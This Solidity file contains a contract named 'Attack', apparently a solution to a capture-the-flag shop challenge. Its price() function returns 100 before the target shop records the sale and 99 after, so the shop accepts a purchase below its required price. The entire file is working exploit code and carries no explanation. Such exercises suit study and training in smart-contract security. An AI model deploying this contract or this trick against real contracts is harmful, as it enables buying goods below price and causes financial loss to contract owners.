pragma solidity ^0.8;

interface IShop {
  function buy() external;

  function price() external view returns (uint256);

  function isSold() external view returns (bool);
}

contract Attack {
  IShop private target;

  constructor(address _target) {
    target = IShop(_target);
  }

  function attack() external {
    target.buy();
  }

  function price() external view returns (uint256) {
    if (target.isSold()) {
      return 99;
    }
    return 100;
  }
}
